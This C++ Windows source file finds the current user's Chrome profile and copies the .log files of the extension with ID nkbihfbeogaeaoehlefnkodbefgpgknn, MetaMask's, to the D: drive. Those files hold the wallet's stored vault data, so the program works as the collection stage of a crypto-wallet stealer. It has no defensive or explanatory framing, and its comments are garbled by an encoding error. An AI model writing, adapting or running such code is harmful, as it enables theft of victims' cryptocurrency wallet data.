#include <iostream>
#include <windows.h>
#include <string>

using namespace std;

// ����һ�����������Ҳ�����.log �ļ�
void copyLogFiles(const std::string& username, const std::string& folderName) {
    string sourcePath = "C:\\Users\\" + username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\" + folderName;
    string destinationPath = "D:\\";

    WIN32_FIND_DATAA findData;
    HANDLE hFind;

    // ���������ļ���·����ģʽ
    std::string searchPath = sourcePath + "\\*.log";

    hFind = FindFirstFileA(searchPath.c_str(), &findData);

    if (hFind == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to find files" << std::endl;
        return;
    }

    do {
        // ���� "." �� ".." Ŀ¼
        if (strcmp(findData.cFileName, ".")!= 0 && strcmp(findData.cFileName, "..")!= 0) {
            std::string sourceFile = sourcePath + "\\" + findData.cFileName;
            std::string destinationFile = destinationPath + findData.cFileName;

            // �����ļ�
            if (!CopyFileA(sourceFile.c_str(), destinationFile.c_str(), FALSE)) {
                std::cerr << "Failed to copy file: " << sourceFile << std::endl;
            }
        }
    } while (FindNextFileA(hFind, &findData));

    FindClose(hFind);
}

int main() {
    char username[MAX_PATH + 1];
    DWORD usernameLength = MAX_PATH + 1;

    if (GetUserNameA(username, &usernameLength)) {
        std::string folderName = "nkbihfbeogaeaoehlefnkodbefgpgknn";  // �ڴ˴�ָ���ļ�������
        copyLogFiles(std::string(username), folderName);
    } else {
        std::cerr << "Failed to get username" << std::endl;
        return 1;
    }

    return 0;
}
